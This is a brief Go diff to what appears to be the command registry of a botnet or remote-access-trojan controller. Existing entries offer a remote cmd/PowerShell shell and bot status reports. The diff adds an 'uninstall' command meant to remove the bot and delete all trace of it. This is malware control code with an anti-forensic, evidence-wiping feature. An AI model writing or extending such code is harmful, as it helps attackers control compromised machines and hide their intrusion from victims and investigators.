@@ -74,4 +74,6 @@ func InitCommands(db *sql.DB) {
 	Insert(db, sqlStr, "shell", "Remote commandline shell, cmd or powershell", byt, 0)
 	// List bot latest information
 	Insert(db, sqlStr, "info", "Request bot latest information", nil, 0)
+	// Uninstall bot itself
+	Insert(db, sqlStr, "uninstall", "Uninstall the bot and delete all trace", nil, 0)
 }
